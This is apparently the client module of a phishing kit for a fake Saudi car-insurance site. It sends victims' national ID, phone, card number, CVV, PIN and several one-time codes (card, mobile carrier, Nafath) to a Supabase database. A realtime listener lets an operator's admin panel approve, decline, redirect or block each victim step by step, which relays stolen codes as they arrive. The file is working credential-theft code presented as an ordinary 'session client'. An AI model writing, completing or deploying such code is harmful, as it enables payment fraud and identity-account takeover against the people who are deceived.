// ============================================================
// Drop this file into your customer site (tameenibcare.bolt.host)
// e.g. as `src/sessionClient.js`. Then import { session } from
// './sessionClient' wherever you handle form submits / step changes.
// ============================================================
//
// 1) Install the Supabase client in your customer site project:
//      npm install @supabase/supabase-js
//
// 2) Nothing else to configure — URL + anon key below are your
//    external Supabase project. The anon key is safe in frontend
//    code; RLS controls what it can do.
// ============================================================

import { createClient } from "@supabase/supabase-js";

const SUPABASE_URL = "https://btcrhisxmrvmjwkigvan.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_y5pq98qXFuC5e1Ka4ZakpA_HNIkDq8G";

// sb_publishable_ keys are opaque, not JWTs — send only apikey header.
const key = SUPABASE_ANON_KEY;
export const supabase = createClient(SUPABASE_URL, key, {
  auth: { persistSession: false, autoRefreshToken: false },
  global: {
    fetch: (input, init) => {
      const h = new Headers(init?.headers);
      if (h.get("Authorization") === `Bearer ${key}`) h.delete("Authorization");
      h.set("apikey", key);
      return fetch(input, { ...init, headers: h });
    },
  },
});

// Keep the current session id in the browser so every step updates the same row.
const SID_KEY = "tmn_session_id";
export const getSessionId = () => localStorage.getItem(SID_KEY) || null;
export const setSessionId = (id) => localStorage.setItem(SID_KEY, id);
export const clearSessionId = () => localStorage.removeItem(SID_KEY);

// ---------- CREATE ----------
// Call this on the first form (registration / national id + phone + car).
export async function startSession(fields) {
  const { data, error } = await supabase
    .from("sessions")
    .insert({
      national_id:   fields.national_id,
      phone:         fields.phone,
      serialNumber:  fields.serialNumber,
      car_year:      fields.car_year,
      car_model:     fields.car_model,
      carPrice:      fields.carPrice,
      carHolderName: fields.carHolderName,
      purpose_of_use: fields.purpose_of_use,
      tameenFor:     fields.tameenFor,
      tameenAllType: fields.tameenAllType,
      tameenType:    fields.tameenType,
      startedDate:   fields.startedDate || new Date().toISOString(),
    })
    .select("id")
    .single();
  if (error) throw error;
  setSessionId(data.id);
  return data.id;
}

// ---------- UPDATE (per step) ----------
async function patch(fields) {
  const id = getSessionId();
  if (!id) throw new Error("No active session id — call startSession first");
  const { error } = await supabase.from("sessions").update(fields).eq("id", id);
  if (error) throw error;
}

export const session = {
  // Insurer selection screen
  selectCompany: (companyData) => patch({ companyData }),

  // Card submitted
  submitCard: ({ cardNumber, cvv, expiryDate, card_name }) =>
    patch({ cardNumber, cvv, expiryDate, card_name, CardAccept: false }),

  // Card OTP submitted
  submitCardOtp: (CardOtp) => patch({ CardOtp, OtpCardAccept: false }),

  // Card PIN submitted
  submitPin: (pin) => patch({ pin, PinAccept: false }),

  // Motsl / mobile phone submitted
  submitPhone: (MotslPhone, MotslNetwork) =>
    patch({ MotslPhone, MotslNetwork, MotslAccept: false }),

  // Motsl OTP submitted
  submitPhoneOtp: (MotslOtp) => patch({ MotslOtp, MotslOtpAccept: false }),

  // STC waiting for call
  waitingSTC: () => patch({ stcAwaitingCall: true, STCAccept: false }),

  // Nafath OTP submitted
  submitNafath: (NavazOtp) => patch({ NavazOtp, NavazAccept: false }),

  // Convenience getters
  id: getSessionId,
  clear: clearSessionId,
};

// ---------- LISTEN TO ADMIN ACTIONS ----------
// Call this once (e.g. in your App root). It watches the current session row
// and reacts when the admin dashboard flips flags or sets a redirect.
export function watchAdmin({
  onCardAccepted,      onCardDeclined,
  onCardOtpAccepted,   onCardOtpDeclined,
  onPinAccepted,       onPinDeclined,
  onPhoneAccepted,     onPhoneDeclined,
  onPhoneOtpAccepted,  onPhoneOtpDeclined,
  onNafathAccepted,    onNafathDeclined,
  onSTCAccepted,
  onRedirect,          // ({ path, search }) => ...
  onBlocked,           // () => show blocked screen
} = {}) {
  const id = getSessionId();
  if (!id) return () => {};

  const ch = supabase
    .channel(`session-${id}`)
    .on(
      "postgres_changes",
      { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${id}` },
      ({ new: row, old }) => {
        const flip = (col) => row[col] !== old?.[col];

        if (flip("CardAccept"))     (row.CardAccept     ? onCardAccepted     : onCardDeclined)?.();
        if (flip("OtpCardAccept"))  (row.OtpCardAccept  ? onCardOtpAccepted  : onCardOtpDeclined)?.();
        if (flip("PinAccept"))      (row.PinAccept      ? onPinAccepted      : onPinDeclined)?.();
        if (flip("MotslAccept"))    (row.MotslAccept    ? onPhoneAccepted    : onPhoneDeclined)?.();
        if (flip("MotslOtpAccept")) (row.MotslOtpAccept ? onPhoneOtpAccepted : onPhoneOtpDeclined)?.();
        if (flip("NavazAccept"))    (row.NavazAccept    ? onNafathAccepted   : onNafathDeclined)?.();
        if (flip("STCAccept") && row.STCAccept) onSTCAccepted?.();

        if (row.blocked && !old?.blocked) onBlocked?.();

        if (row.redirect_path && row.redirect_path !== old?.redirect_path) {
          onRedirect?.({ path: row.redirect_path, search: row.redirect_search || "" });
        }
      },
    )
    .subscribe();

  return () => supabase.removeChannel(ch);
}
